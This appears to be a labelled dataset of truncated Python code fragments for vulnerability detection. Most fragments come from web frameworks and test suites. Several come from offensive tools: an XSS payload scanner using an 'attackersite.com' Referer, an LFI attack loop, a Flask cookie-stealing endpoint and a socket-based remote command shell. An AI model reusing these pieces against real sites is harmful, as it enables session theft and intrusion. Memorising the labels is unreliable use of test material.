frappe.db.get_value(self.doctype, self.name, key) \tdef get", "label": 0}, {"snippet_id": 40613, "code": " be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide", "label": 0}, {"snippet_id": 12331, "code": "]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^", "label": 0}, {"snippet_id": 27368, "code": "\"Json encoder.\"\"\" _EPOCH=datetime.datetime.utcfromtimestamp(0) def default(self, obj): if isinstance(obj, ndb.Model): dict_obj=obj.to_dict() dict_obj['id']=obj.key.id() return dict_obj elif isinstance(obj,", "label": 0}, {"snippet_id": 23683, "code": "\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement", "label": 1}, {"snippet_id": 52809, "code": "(dict([(param['name'], param['value']) for param in parameters])) params_form=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form,", "label": 0}, {"snippet_id": 25385, "code": " NamePartsFormField(forms.MultiValueField): widget=NamePartsWidget def compress(self, data_list) -> dict: data={} data['_scheme']=self.scheme_name for i, value in enumerate(data_list): data[self.scheme['fields'", "label": 0}, {"snippet_id": 50904, "code": " datetime, timedelta import pytz from constance.admin import Config, ConstanceAdmin, ConstanceForm from cryptography.fernet import Fernet from django.conf import settings from django.contrib import admin from", "label": 0}, {"snippet_id": 40251, "code": " \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\"", "label": 0}, {"snippet_id": 27141, "code": " form_counter, url) params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I) if m_input: m_value=re.match(r'.*\\", "label": 1}, {"snippet_id": 10178, "code": " test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ", "label": 0}, {"snippet_id": 27314, "code": " import base64 import cgi import datetime import json import logging import os import re import sys import traceback import urllib.parse import jinja2 import webapp2 from base import utils from config import", "label": 0}, {"snippet_id": 42822, "code": "\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})): \t\t\tdocname=self.get(df.fieldname) \t\t\tif docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not", "label": 0}, {"snippet_id": 6885, "code": ".section, 'default_scoped_affiliation') @property def vccs_url(self): \"\"\" URL to use with VCCS client. BCP is to have an nginx or similar on localhost that will proxy requests to a currently available backend", "label": 0}, {"snippet_id": 50442, "code": ".get('csessid')[0] self.last_alive[csessid]=(time.time(), False) dataentries=self.databuffer.get(csessid,[]) if dataentries: return dataentries.pop(0) request.notifyFinish().addErrback(self._responseFailed", "label": 0}, {"snippet_id": 38710, "code": ": \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]), filters, limit", "label": 0}, {"snippet_id": 14997, "code": " the functionality is inherited from BokChoyTestSuite, so those tests aren't duplicated. \"\"\" def setUp(self): super(TestPaverPa11yCrawlerCmd, self).setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite", "label": 0}, {"snippet_id": 35930, "code": ">\" in value and not(\"<script\" in value or \"javascript:\" in value): \t\t\t\t \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tsanitized_value=value \t\t\tif df and df.get(\"fieldtype\") in(\"Data\", \"Code\", \"Small", "label": 0}, {"snippet_id": 13589, "code": "'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',", "label": 0}, {"snippet_id": 31856, "code": ".get_dick_permit() \tpath=sql.get_setting('haproxy_dir')+\"/\"+form.getvalue('color') \t \tfor server in servers: \t\tfunct.ssh_command(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue(", "label": 0}, {"snippet_id": 42203, "code": " list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns", "label": 0}, {"snippet_id": 23689, "code": "(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR", "label": 1}, {"snippet_id": 38428, "code": ".db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"", "label": 0}, {"snippet_id": 2274, "code": " result is not True: parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,", "label": 0}, {"snippet_id": 2059, "code": ".api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"", "label": 0}, {"snippet_id": 10239, "code": " def test_verify_xss_env_var(self): self.env_var_override.set('VERIFY_XSS', 'True') with self.env_var_override: suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 1}, {"snippet_id": 39476, "code": "\t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname", "label": 0}, {"snippet_id": 13035, "code": "'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user',", "label": 0}, {"snippet_id": 48555, "code": ": forward_url=request.GET[\"redirect\"] if \"srid\" in request.GET: if not request.GET.get(\"rid\"): return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id\") srid: int=int(request.GET", "label": 0}, {"snippet_id": 45653, "code": ".link(bundle_doc, owner=bundle_doc.owner, name=bundle_doc.name, description=bundle_doc.description, extra='bundle2') if bundle_data['coordinators']: dependencies=Document2.objects.filter(type='oozie-coordinator2", "label": 0}, {"snippet_id": 47628, "code": "=str(1), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea", "label": 0}, {"snippet_id": 15899, "code": "\"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params", "label": 0}, {"snippet_id": 51301, "code": " 'internet_nl_api_username') search_fields=('name',) list_filter=['enable_logins'][::-1] fields=('name', 'enable_logins', 'internet_nl_api_username', 'internet_nl_api_password') def save_model(self, request", "label": 0}, {"snippet_id": 10625, "code": " class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is a subset): test_dir -parent directory for tests log_dir -directory for test output report_dir -directory for", "label": 0}, {"snippet_id": 43327, "code": ".format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype", "label": 0}, {"snippet_id": 109, "code": " xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request.text.find(payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable", "label": 1}, {"snippet_id": 31946, "code": ".get_files(dir=list, format=\"lst\") \tfor list in lists: \t\tprint(list) \t\t if form.getvalue('get_ldap_email'): \tusername=form.getvalue('get_ldap_email') \timport ldap \t \tserver=sql.get_setting('ldap_server", "label": 0}, {"snippet_id": 43275, "code": "\tdb_values=frappe.get_doc(self.doctype, self.name).as_dict() \t\tfor key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key", "label": 0}, {"snippet_id": 25387, "code": ".MultiValueField): widget=NamePartsWidget def compress(self, data_list) -> dict: data={} data['_scheme']=self.scheme_name for i, value in enumerate(data_list): data[self.scheme['fields'][i][0]]=value or", "label": 0}, {"snippet_id": 5275, "code": "'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5", "label": 0}, {"snippet_id": 29989, "code": " form.getvalue('ssl_cert'): \tcert_local_dir=funct.get_config_var('main', 'cert_local_dir') \tcert_path=sql.get_setting('cert_path') \t \tif not os.path.exists(cert_local_dir): \t\tos.makedirs(cert_local_dir)", "label": 0}, {"snippet_id": 30156, "code": " is not None: \taction=form.getvalue('action_hap') \t \tif funct.check_haproxy_config(serv): \t\tcommands=[ \"sudo systemctl %s haproxy\" % action] \t\tfunct.ssh_command(serv, commands)\t\t \t\tprint(\"HAproxy was %s\"", "label": 0}, {"snippet_id": 27240, "code": " print \"BEstAutomaticXSSFinder v1.0\" print \"DISCLAIMER: For testing purposes only!\\n\" if __name__==\"__main__\": banner() if len(sys.argv) !=2: print \"program[url]\" exit() url=sys.argv[1] if url.find(\"http", "label": 1}, {"snippet_id": 22155, "code": ".index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user", "label": 0}, {"snippet_id": 45951, "code": " DEFAULT_LAYOUT=[ {\"size\":2,\"rows\":[{\"widgets\":[]}],\"drops\":[\"temp\"],\"klass\":\"card card-home card-column span2\"}, {\"size\":10,\"rows\":[{\"widgets\":[ {\"size\":12,\"name\":\"Filter Bar\",\"widgetType\":\"filter-widget\"", "label": 0}, {"snippet_id": 7253, "code": "'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html", "label": 0}, {"snippet_id": 7565, "code": ", 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+", "label": 1}, {"snippet_id": 42490, "code": ".DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef", "label": 0}, {"snippet_id": 37204, "code": " from frappe import _ from frappe.website.website_generator import WebsiteGenerator from frappe.website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname,", "label": 1}, {"snippet_id": 2117, "code": ",headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse", "label": 0}, {"snippet_id": 19317, "code": "', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual", "label": 0}, {"snippet_id": 39001, "code": " not sanitize and d[fieldname] is None: \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance", "label": 0}, {"snippet_id": 32123, "code": ".keystone.mapping_delete(request, obj_id) class MappingFilterAction(tables.FilterAction): def filter(self, table, mappings, filter_string): \"\"\"Naive case-insensitive search.\"\"\" q=filter_string.lower() return", "label": 0}, {"snippet_id": 1707, "code": ": all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert'], 'req_headers': data['req_headers'], 'req_body': data['req_body'], 'res_headers': data['res_headers'], 'res_body': data[", "label": 0}, {"snippet_id": 2906, "code": "=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload", "label": 0}, {"snippet_id": 40607, "code": "): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t", "label": 0}, {"snippet_id": 50808, "code": ") or not(xterm256 or useansi)) screenreader=options.get(\"screenreader\", flags.get(\"SCREENREADER\", False)) prompt=options.get(\"send_prompt\", False) if screenreader: text=parse_ansi(text, strip_ansi=True", "label": 0}, {"snippet_id": 2662, "code": ":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http://attackersite.com?test=", "label": 0}, {"snippet_id": 25960, "code": ".fields[key]=value value.initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm(forms.ModelForm): vat_warning=False class Meta: model=InvoiceAddress fields=('is_business', 'company'", "label": 0}, {"snippet_id": 50058, "code": "\"\" An ajax/comet long-polling transport \"\"\" isLeaf=True allowedMethods=('POST',) def __init__(self): self.requests={} self.databuffer={} self.last_alive={} self.keep_alive=None def _responseFailed(self", "label": 0}, {"snippet_id": 34884, "code": "\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", ", "label": 0}, {"snippet_id": 1214, "code": ".get_json() try: name=content['appname'] url=content['url'] headers=content['headers'] body=content['body'] method=content['method'] api=\"Y\" scan_status=scan_single_api(url, method, headers, body, api, scanid", "label": 0}, {"snippet_id": 49838, "code": " shell(): return html @socketio.on('sendMSG') def sendMSG(message): print(\"OUTPUT> \"+str(message)) command=raw_input(\"CMD> \") emit(\"getMSG\",command+\"\\n\") if command==\"exit\": exit() if __name__=='__main__", "label": 0}, {"snippet_id": 15590, "code": ") self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from", "label": 0}, {"snippet_id": 53964, "code": ")+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==", "label": 0}, {"snippet_id": 963, "code": " xss_result=True if xss_result is True: print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site", "label": 1}, {"snippet_id": 6420, "code": ".config.get(self.section, 'server_cert') @property def server_key(self): \"\"\" SSL private key filename(None==SSL disabled) \"\"\" return self.config.get(self.section, 'server_key') @property def cert_chain", "label": 0}, {"snippet_id": 3557, "code": "(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1", "label": 0}, {"snippet_id": 37863, "code": ") \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self): \t\treturn self.title \tdef validate", "label": 0}, {"snippet_id": 28964, "code": "=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\" \" +line +\"\\n\" \ttry:\t\t \t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \t\tlog.write(diff) \t\tlog.close \texcept IOError: \t\tprint", "label": 0}, {"snippet_id": 8826, "code": ".html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url", "label": 0}, {"snippet_id": 27032, "code": " DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for lfi in lfi_attacks: post_params={} counter+=1 parameters=\"\" for i in range(0,len(params)): for j in", "label": 0}, {"snippet_id": 41311, "code": " name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select", "label": 0}, {"snippet_id": 21716, "code": ".peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')),", "label": 0}, {"snippet_id": 35196, "code": "(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\",", "label": 0}, {"snippet_id": 18296, "code": "/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^", "label": 1}, {"snippet_id": 7996, "code": "/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups", "label": 0}, {"snippet_id": 33501, "code": " frappe.website.utils import find_first_image, get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t", "label": 0}, {"snippet_id": 25022, "code": "=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self", "label": 0}, {"snippet_id": 40654, "code": "(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value) or( meta_df and meta_df.print_hide_if_no_value) \t\tif not print_hide: \t\t\tif df and df.print_hide is not None: ", "label": 0}, {"snippet_id": 1689, "code": "': data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data", "label": 0}, {"snippet_id": 28670, "code": ".get_user_name_by_uuid(user_uuid.value) is None: \t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \telse: \t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) ", "label": 0}, {"snippet_id": 46157, "code": "(request): engine=request.GET.get('engine', 'solr') collections=get_engine(request.user, engine).datasets() if not collections: return no_collections(request) collection=Collection2(user=request.user, name", "label": 0}, {"snippet_id": 25905, "code": ": field=SplitDateTimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None, widget=SplitDateTimePickerWidget", "label": 0}, {"snippet_id": 45475, "code": " request.fs, request.jt, mapping).deploy() properties={'wf_application_path': request.fs.get_hdfs_path(wf_dir)} properties.update(mapping) submission=Submission(request.user, coordinator, request.fs, request", "label": 0}, {"snippet_id": 52266, "code": "'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user doc2.save() doc2.doc.all().delete() doc2", "label": 0}, {"snippet_id": 42266, "code": "\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t", "label": 0}, {"snippet_id": 10456, "code": ".setUp() mock_sh=patch('pavelib.utils.test.suites.bokchoy_suite.sh') self._mock_sh=mock_sh.start() self.addCleanup(mock_sh.stop) def _expected_command(self, report_dir, start_urls): \"\"\" Returns the expected", "label": 0}, {"snippet_id": 34028, "code": " else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags", "label": 0}, {"snippet_id": 6677, "code": "._parsed_status_test_usernames=res return res @property def signup_link(self): \"\"\" URL(string) for use in simple templating of login.html. \"\"\" return self.config.get(self.section, 'signup_link') @property", "label": 0}, {"snippet_id": 19730, "code": " ImportError: colorize=lambda color, text: text __test__=False DEFAULT_NUM_PROCESSES=1 DEFAULT_VERBOSITY=2 class BokChoyTestSuite(TestSuite): \"\"\" TestSuite for running Bok Choy tests Properties(below is", "label": 0}, {"snippet_id": 32491, "code": "=value.replace(u' ', u'-') value=re.sub(r'([-_])[-_]+', r'\\1', value) return value class Server(SocketServer.TCPServer): def __init__(self, server_address, top_level): SocketServer.TCPServer.__init__(self", "label": 0}, {"snippet_id": 53175, "code": "): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if", "label": 0}, {"snippet_id": 29454, "code": "-permanent' % bind) \t\t\t\t \tfirewalld_commands.append('sudo firewall-cmd --reload') \treturn firewalld_commands \t def check_haproxy_config(serv): \timport sql \tcommands=[ \"haproxy -q -c -f %s\" % sql.get_setting(", "label": 0}, {"snippet_id": 20487, "code": " def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github.", "label": 0}, {"snippet_id": 41496, "code": "(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]) \t\tif not post.comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments=", "label": 0}, {"snippet_id": 48891, "code": " return '?{}'.format(urlencode(query)) class SmartListField(object): def __init__(self, smart_list_item, column, object): self.smart_list_item=smart_list_item self.column=column self.object=object def get_value", "label": 0}, {"snippet_id": 29546, "code": " proc_count\t\t def ssh_command(serv, commands, **kwargs): \tssh=ssh_connect(serv) \t\t \tfor command in commands: \t\ttry: \t\t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\texcept: \t\t\tcontinue \t\t\t\t", "label": 0}, {"snippet_id": 16258, "code": " not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id", "label": 0}, {"snippet_id": 34784, "code": "\"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self", "label": 0}, {"snippet_id": 7661, "code": "/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page", "label": 1}, {"snippet_id": 30895, "code": "=\"configShow\": \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \t \tif form.getvalue('configver') is None:\t \t\tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\"", "label": 0}, {"snippet_id": 32912, "code": "/b>') else: bold=('', '') self.wfile.write('<a href=\"%s/%s\">%s%s%s</a><br/>\\n' % (self.path.rstrip('/'), f, bold[0], f, bold[1])) self.wfile.write('<br/>\\n') for d in sorted(dirs): if d.startswith('.')", "label": 1}, {"snippet_id": 19428, "code": ".verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be", "label": 0}, {"snippet_id": 30493, "code": "'syslog_server') \t \tif waf==\"1\": \t\tlocal_path_logs='/var/log/modsec_audit.log' \t\tcommands=[ \"sudo cat %s |tail -%s %s %s\" %(local_path_logs, rows, grep_act, grep)]\t \t\t \tfunct.ssh_command(syslog_server,", "label": 0}, {"snippet_id": 35740, "code": "=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length", "label": 0}, {"snippet_id": 44082, "code": "{ 'language': TermsFacet(field='language') } class FileSearch(RTDFacetedSearch): facets={ 'project': TermsFacet(field='project'), 'version': TermsFacet(field='version') } def query(self, search, query)", "label": 0}, {"snippet_id": 17431, "code": ".migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 21775, "code": "[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), )", "label": 0}, {"snippet_id": 16465, "code": " urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile')", "label": 0}, {"snippet_id": 53240, "code": ":editor_submit_coordinator', kwargs={'doc_id': coordinator.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_coordinator(request, coordinator, mapping", "label": 0}, {"snippet_id": 34800, "code": ".__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm\"):", "label": 0}, {"snippet_id": 125, "code": "=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11", "label": 1}, {"snippet_id": 42496, "code": "\t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself.set(\"__islocal\", False) \tdef db_update(self): \t\tif self.get(\"__islocal\") or not self.name: \t\t\tself.db_insert", "label": 0}, {"snippet_id": 1905, "code": " temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid", "label": 1}, {"snippet_id": 35323, "code": ".append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values if not set''", "label": 0}, {"snippet_id": 54173, "code": "(row=0) Label(main, text=\"Cookie:(Optional)\",background='light sky blue').grid(row=1) Label(main, text=\"Method:\",background='light sky blue').grid(row=2) Label(main, text=\"Timeout:\",background='light sky", "label": 0}, {"snippet_id": 13772, "code": "/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>", "label": 1}, {"snippet_id": 38974, "code": ", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname", "label": 0}, {"snippet_id": 48096, "code": " file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height /=diameter", "label": 